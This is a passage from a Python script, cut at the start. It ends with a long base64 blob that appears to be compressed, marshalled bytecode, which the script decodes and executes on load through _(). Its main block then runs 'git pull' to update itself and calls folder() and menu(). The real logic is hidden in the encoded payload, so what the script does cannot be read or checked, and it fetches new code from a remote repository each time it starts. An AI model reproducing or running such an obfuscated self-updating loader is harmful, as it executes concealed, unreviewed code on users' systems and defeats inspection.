YAG1KqkaXuIDKLgwkCUJFeYJQCitFuCOFuWRoPQhlYTVpbePR4ETAiKJQ5ejzDqCjG93uIIIOJANUSCPaROlNAVFr/FJCKUygBGTYpbVuiV4hj5ZJHd3a6EORiPKWCHQcpaNvuCr6ShNG357qcr/wVUK/HtZV4SW2cOFe9N0IEIfWFQv3knlkhiTaO20KawmooPUtxfwFQZQt7UftwPeJGBgd9fu1T2RRhRvQ8QxH/oDjVjv8MHvq+D+/LnrarSH4dVs9kE0d/3VC7yCUl+lTUSfNvQVZ1yLkXkPwnoHRdsjE0lYeMrI+oHD28Gk5sU/aum6NwewR61pqAMZHrO7UOBnF1URnfvQNTO/rQinRllGujOyMskMOAYHgARlWwD0BcckAYZ4H8UUA3i5bCQ1EGrrwRXKUJX2r8CXu8xoLxFhS0ZEKP5GN3gc/GzryAaESftjvvNptHf/1W/2pziv/Az3925A=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
       
if __name__ == '__main__':
    os.system('git pull')
#   __ aangxd__(ganteng)
#    cek_opsi()
    folder()
    menu()    
    
